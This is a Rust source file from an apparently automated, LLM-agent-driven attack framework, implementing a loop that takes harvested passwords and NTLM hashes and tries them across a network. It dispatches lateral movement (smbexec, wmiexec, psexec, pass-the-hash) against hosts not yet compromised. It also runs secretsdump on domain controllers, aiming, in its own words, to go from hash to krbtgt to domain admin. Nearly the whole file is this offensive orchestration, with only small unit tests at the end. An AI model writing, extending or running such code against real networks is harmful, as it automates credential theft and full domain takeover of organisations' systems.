//! auto_credential_expansion -- test new credentials across discovered hosts.
//!
//! When new credentials arrive, this automation tries lateral movement
//! (smbexec, wmiexec, psexec) against non-owned hosts. It also tries
//! secretsdump on DCs for ALL credentials (not just admin — the credential
//! access agent determines feasibility).

use std::sync::Arc;
use std::time::Duration;

use tokio::sync::watch;
use tracing::debug;

use crate::dispatcher::Dispatcher;
use crate::state::*;

/// Lateral movement techniques to try, in order of stealth preference.
const LATERAL_TECHNIQUES: &[&str] = &["smbexec", "wmiexec", "psexec"];

/// Monitors for new credentials and dispatches lateral movement + secretsdump.
/// Interval: 15s. Enhanced version of the original auto_credential_expansion.
pub async fn auto_credential_expansion(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(15));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let work: Vec<ExpansionWork> = {
            let state = dispatcher.state.read().await;

            // Skip if already domain admin
            if state.has_domain_admin {
                continue;
            }

            state
                .credentials
                .iter()
                .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
                .filter_map(|cred| {
                    let dedup = format!(
                        "{}:{}",
                        cred.domain.to_lowercase(),
                        cred.username.to_lowercase()
                    );
                    if state.is_processed(DEDUP_EXPANSION_CREDS, &dedup) {
                        return None;
                    }

                    // Collect non-owned host IPs in the same domain or any domain
                    let targets: Vec<String> = state
                        .hosts
                        .iter()
                        .filter(|h| !h.owned)
                        .map(|h| h.ip.clone())
                        .collect();

                    if targets.is_empty() {
                        return None;
                    }

                    // Also find DCs for this credential's domain (for secretsdump)
                    let dc_ip = state
                        .domain_controllers
                        .get(&cred.domain.to_lowercase())
                        .cloned();

                    Some(ExpansionWork {
                        dedup_key: dedup,
                        credential: cred.clone(),
                        targets,
                        dc_ip,
                        is_admin: cred.is_admin,
                    })
                })
                .take(3) // Process max 3 new creds per cycle
                .collect()
        };

        for item in work {
            // 1. Try lateral movement on non-DC hosts (up to 5 targets)
            let technique = LATERAL_TECHNIQUES[0]; // Start with smbexec
            for target_ip in item.targets.iter().take(5) {
                if let Ok(Some(task_id)) = dispatcher
                    .request_lateral(target_ip, &item.credential, technique)
                    .await
                {
                    debug!(
                        task_id = %task_id,
                        target = %target_ip,
                        technique = technique,
                        username = %item.credential.username,
                        "Credential expansion lateral dispatched"
                    );
                }
            }

            // 2. Try secretsdump on DC for ALL credentials (not just admin).
            // Secretsdump requires admin rights but we dispatch speculatively —
            // the LLM agent will determine if the credential has sufficient privileges.
            // Admin creds get higher priority (2 vs 5).
            if let Some(ref dc_ip) = item.dc_ip {
                let sd_dedup = format!(
                    "{}:{}:{}",
                    dc_ip,
                    item.credential.domain.to_lowercase(),
                    item.credential.username.to_lowercase()
                );
                let already_dumped = {
                    let state = dispatcher.state.read().await;
                    state.is_processed(DEDUP_SECRETSDUMP, &sd_dedup)
                };

                if !already_dumped {
                    let priority = if item.is_admin { 2 } else { 5 };
                    if let Ok(Some(task_id)) = dispatcher
                        .request_secretsdump(dc_ip, &item.credential, priority)
                        .await
                    {
                        debug!(
                            task_id = %task_id,
                            dc = %dc_ip,
                            is_admin = item.is_admin,
                            "Credential secretsdump dispatched"
                        );

                        dispatcher
                            .state
                            .write()
                            .await
                            .mark_processed(DEDUP_SECRETSDUMP, sd_dedup.clone());
                        let _ = dispatcher
                            .state
                            .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &sd_dedup)
                            .await;
                    }
                }
            }

            // Always mark as processed — even if throttled/deferred — to prevent
            // the credential from being retried every 15s and flooding the deferred queue.
            dispatcher
                .state
                .write()
                .await
                .mark_processed(DEDUP_EXPANSION_CREDS, item.dedup_key.clone());
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_EXPANSION_CREDS, &item.dedup_key)
                .await;
        }

        // 3. Try hashes for pass-the-hash lateral movement
        let hash_work: Vec<HashExpansionWork> = {
            let state = dispatcher.state.read().await;

            if state.has_domain_admin {
                continue;
            }

            state
                .hashes
                .iter()
                .filter(|h| {
                    h.hash_type.to_lowercase() == "ntlm"
                        && !h.domain.is_empty()
                        && h.username.to_lowercase() != "krbtgt"
                        && !h.username.ends_with('$')
                })
                .filter_map(|hash| {
                    let dedup = format!(
                        "{}:{}:{}",
                        hash.domain.to_lowercase(),
                        hash.username.to_lowercase(),
                        &hash.hash_value[..32.min(hash.hash_value.len())]
                    );
                    if state.is_processed(DEDUP_HASH_LATERAL, &dedup) {
                        return None;
                    }

                    let targets: Vec<String> = state
                        .hosts
                        .iter()
                        .filter(|h| !h.owned)
                        .map(|h| h.ip.clone())
                        .collect();

                    if targets.is_empty() {
                        return None;
                    }

                    Some(HashExpansionWork {
                        dedup_key: dedup,
                        hash: hash.clone(),
                        targets,
                    })
                })
                .take(2)
                .collect()
        };

        for item in hash_work {
            // Build a credential-like object for pass-the-hash
            let pth_cred = ares_core::models::Credential {
                id: format!("pth_{}", item.hash.username),
                username: item.hash.username.clone(),
                password: item.hash.hash_value.clone(),
                domain: item.hash.domain.clone(),
                source: "hash_pth".to_string(),
                discovered_at: None,
                is_admin: false,
                parent_id: None,
                attack_step: 0,
            };

            for target_ip in item.targets.iter().take(3) {
                if let Ok(Some(task_id)) = dispatcher
                    .request_lateral(target_ip, &pth_cred, "pth_smbclient")
                    .await
                {
                    debug!(
                        task_id = %task_id,
                        target = %target_ip,
                        username = %item.hash.username,
                        "Hash-based lateral dispatched"
                    );
                }
            }

            // 4. Hash→secretsdump: try pass-the-hash secretsdump against DCs.
            // This is the fastest path from hash → krbtgt → DA.
            {
                let state = dispatcher.state.read().await;
                let dc_ips: Vec<String> = state.domain_controllers.values().cloned().collect();
                drop(state);

                for dc_ip in dc_ips {
                    let sd_dedup = format!(
                        "{}:{}:{}",
                        dc_ip,
                        item.hash.domain.to_lowercase(),
                        item.hash.username.to_lowercase()
                    );
                    let already = {
                        let state = dispatcher.state.read().await;
                        state.is_processed(DEDUP_SECRETSDUMP, &sd_dedup)
                    };
                    if !already {
                        if let Ok(Some(task_id)) =
                            dispatcher.request_secretsdump(&dc_ip, &pth_cred, 2).await
                        {
                            debug!(
                                task_id = %task_id,
                                dc = %dc_ip,
                                username = %item.hash.username,
                                "Hash-based secretsdump dispatched"
                            );
                            dispatcher
                                .state
                                .write()
                                .await
                                .mark_processed(DEDUP_SECRETSDUMP, sd_dedup.clone());
                            let _ = dispatcher
                                .state
                                .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &sd_dedup)
                                .await;
                        }
                    }
                }
            }

            // Always mark as processed to prevent retry storms.
            dispatcher
                .state
                .write()
                .await
                .mark_processed(DEDUP_HASH_LATERAL, item.dedup_key.clone());
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_HASH_LATERAL, &item.dedup_key)
                .await;
        }
    }
}

struct ExpansionWork {
    dedup_key: String,
    credential: ares_core::models::Credential,
    targets: Vec<String>,
    dc_ip: Option<String>,
    is_admin: bool,
}

struct HashExpansionWork {
    dedup_key: String,
    hash: ares_core::models::Hash,
    targets: Vec<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_lateral_techniques_order() {
        // smbexec first (stealthiest), then wmiexec, then psexec
        assert_eq!(LATERAL_TECHNIQUES[0], "smbexec");
        assert_eq!(LATERAL_TECHNIQUES[1], "wmiexec");
        assert_eq!(LATERAL_TECHNIQUES[2], "psexec");
    }

    #[test]
    fn test_lateral_techniques_count() {
        assert_eq!(LATERAL_TECHNIQUES.len(), 3);
    }

    #[test]
    fn test_lateral_techniques_contains() {
        assert!(LATERAL_TECHNIQUES.contains(&"smbexec"));
        assert!(LATERAL_TECHNIQUES.contains(&"wmiexec"));
        assert!(LATERAL_TECHNIQUES.contains(&"psexec"));
        assert!(!LATERAL_TECHNIQUES.contains(&"evil-winrm"));
    }
}
